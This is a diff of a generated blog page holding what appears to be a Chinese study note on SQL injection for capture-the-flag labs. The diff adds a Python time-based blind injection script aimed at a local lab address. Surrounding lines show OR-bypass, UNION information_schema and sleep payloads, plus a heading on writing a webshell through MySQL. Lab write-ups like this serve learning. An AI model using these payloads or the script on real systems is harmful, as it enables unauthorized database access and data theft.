@@ -30,6 +30,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231221193850425.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231221151918687.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231221151937380.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231223211008350.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222144701150.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222145859528.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222150318949.png">
@@ -37,7 +38,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222153434535.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222163353266.png">
 <meta property="article:published_time" content="2023-12-20T07:02:42.000Z">
-<meta property="article:modified_time" content="2023-12-22T08:36:35.833Z">
+<meta property="article:modified_time" content="2023-12-23T13:10:21.143Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220150816066.png">
@@ -72,7 +73,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>34</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>35</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
@@ -164,7 +165,7 @@
 <p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220165811834.png" alt="image-20231220165811834"></p>
 <h4 id="网页中获取用户为flag的信息，列子"><a href="#网页中获取用户为flag的信息，列子" class="headerlink" title="网页中获取用户为flag的信息，列子"></a>网页中获取用户为flag的信息，列子</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
 
-<h5 id="用or"><a href="#用or" class="headerlink" title="用or"></a>用or</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or username=&#x27;flag&#x27; -- -</span><br></pre></td></tr></table></figure>
+<h5 id="用o"><a href="#用o" class="headerlink" title="用o"></a>用o</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or username=&#x27;flag&#x27; -- -</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231220170522705.png" alt="image-20231220170522705"></p>
 <h5 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#获取库名</span><br><span class="line">0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();-- -</span><br><span class="line">#查到库的名字为ctfshow_user</span><br></pre></td></tr></table></figure>
@@ -198,7 +199,10 @@
 <h3 id="睡眠注入"><a href="#睡眠注入" class="headerlink" title="睡眠注入"></a>睡眠注入</h3><p>用if语句判断是否成立，不成立者进行睡眠。来判断是否能进行SQL注入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- -</span><br></pre></td></tr></table></figure>
 
-<h3 id="注入webshell"><a href="#注入webshell" class="headerlink" title="注入webshell"></a>注入webshell</h3><p>@@datadir 查看mysql路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># ?id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">tr=&#x27;username&#x27;</span><br><span class="line">name=&#x27;&#x27;</span><br><span class="line">url1=&quot;http://192.168.2.8/sqli/Less-9/?id=1&#x27;&quot;</span><br><span class="line">for j in range(1,10):</span><br><span class="line">  for i in range(65,123):</span><br><span class="line">    url=url1+&quot;and if( ascii(substring(database(),&quot;+str(j)+&quot;,1))= &quot;+str(i)+&quot;,sleep(3),1)-- -&quot;</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    elapsed_time = end_time - start_time</span><br><span class="line">    if elapsed_time &gt; 3: # 如果响应时间超过5秒</span><br><span class="line">      name=name+chr(i)</span><br><span class="line">      print(name)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231223211008350.png" alt="image-20231223211008350"></p>
+<h3 id="注入webshell，文本注入"><a href="#注入webshell，文本注入" class="headerlink" title="注入webshell，文本注入"></a>注入webshell，文本注入</h3><p>@@datadir 查看mysql路径</p>
 <p>@@secure_file_priv 查看限制</p>
 <p>打开phpstudy中的MySQL配置文件</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222144701150.png" alt="image-20231222144701150"></p>
@@ -290,7 +294,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>34</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>35</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
